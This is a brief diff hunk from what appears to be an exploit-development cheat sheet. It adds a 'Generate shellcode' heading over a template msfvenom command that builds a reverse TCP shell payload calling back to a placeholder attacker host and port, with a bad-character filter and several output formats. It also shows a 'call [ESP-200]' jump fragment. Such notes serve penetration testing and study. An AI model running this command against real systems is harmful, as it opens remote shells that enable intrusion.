@@ -386,6 +386,7 @@ Or
 
 ```call [ESP-200]```
 
+Generate shellcode:
 ```
 msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -b “\x0\x04\x2f\x3a” -o filename
 ```
